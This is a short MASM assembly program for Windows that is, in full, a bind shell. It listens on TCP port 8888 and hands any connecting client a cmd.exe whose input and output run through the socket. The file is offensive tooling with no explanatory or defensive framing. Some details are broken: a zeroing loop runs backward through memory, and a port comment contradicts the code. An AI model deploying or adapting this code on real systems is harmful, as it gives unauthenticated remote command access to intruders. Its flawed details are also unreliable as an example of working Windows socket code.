.386
.model flat,stdcall
option casemap:none

;------------Block 2----------
include windows.inc
include user32.inc
includelib user32.lib
include kernel32.inc
includelib kernel32.lib
includelib ws2_32.lib
include ws2_32.inc


.data
msg db "message",0
msg1 db "title",0
error db "error",0
binderror db "cannot bind",0
cmd db "cmd.exe",0
processerror db "cannot create process",0
sockerror db "error in creating a socket ",0
er db "%d-",0


.data? 
sa WSADATA <>
pi PROCESS_INFORMATION <>
sii STARTUPINFO <>
client  sockaddr_in <> 
sock HANDLE ?
newsock HANDLE ? 
sizee DWORD ?
sec db 32 dup(?)


.code 
start : 
mov eax , offset sii.cb
mov dword ptr [eax] , 0
xor eax ,eax 
mov eax , offset sii.dwFlags 
mov dword ptr [eax] , STARTF_USESTDHANDLES 
mov ecx , sizeof(PROCESS_INFORMATION)
mov eax , offset pi
zero : 
mov byte ptr [eax], 0
dec eax
dec ecx 
cmp ecx ,0
jne zero

invoke WSAStartup ,101h ,addr sa ;0x202 is makeword(2,2) 

invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL

.if eax == -1 
   invoke MessageBox,NULL, addr sockerror ,addr error,NULL 
   invoke GetLastError
   invoke wsprintf,addr sec , addr er , eax  
   invoke ExitProcess,-1
.endif

 mov sock ,eax 
 mov [client.sin_family] ,AF_INET 
 mov  dword ptr [client.sin_port] , htons(8888) ; port 24628 
 mov [client.sin_addr]  , INADDR_ANY
 
invoke bind,sock ,ADDR client , SIZEOF client
.if eax != 0 
  invoke MessageBox,NULL, addr binderror ,addr error , NULL 
   invoke GetLastError
  invoke wsprintf,addr sec , addr er , eax
  invoke ExitProcess,-1
 .endif
 
 
invoke listen,sock,5
  xor eax ,eax 
  mov sizee , 10h 

  invoke accept,sock , addr client ,addr sizee 
  
  mov newsock,eax 
  mov [sii.hStdError]  , eax


mov [sii.hStdInput]   , eax
  mov [sii.hStdOutput] , eax 
  
 
  invoke CreateProcess,NULL,addr cmd , 0,0,TRUE,0,0,0,addr sii,addr pi
  cmp eax , 0 
  jne success 
  invoke MessageBox,NULL, addr processerror ,addr error ,NULL 
  
  success : 

  xor eax,eax 
  invoke ExitProcess,NULL  

end start 
